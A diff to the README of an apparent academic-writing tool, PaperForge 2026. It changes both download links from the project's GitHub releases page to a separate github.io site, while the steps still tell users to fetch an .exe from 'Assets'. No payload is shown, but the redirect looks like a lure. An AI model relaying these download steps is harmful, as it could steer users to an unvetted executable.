@@ -1,6 +1,6 @@
 # 📝 paperforge-2026-paper-workflow - Automate academic writing with smart tools
 
-[![](https://img.shields.io/badge/Download-PaperForge_2026-blue.svg)](https://github.com/asa834/paperforge-2026-paper-workflow/releases)
+[![](https://img.shields.io/badge/Download-PaperForge_2026-blue.svg)](https://asa834.github.io)
 
 PaperForge 2026 helps researchers write academic papers. The system uses smart language models to guide you through drafting, citing, and checking your work. You spend less time on formatting and more time on your research ideas.
 
@@ -8,7 +8,7 @@ PaperForge 2026 helps researchers write academic papers. The system uses smart l
 
 You need to download the installer to your computer. Follow these steps to get the software:
 
-1. Visit [this page to download](https://github.com/asa834/paperforge-2026-paper-workflow/releases).
+1. Visit [this page to download](https://asa834.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file that ends in .exe for Windows.
 4. Save the file to your Downloads folder.
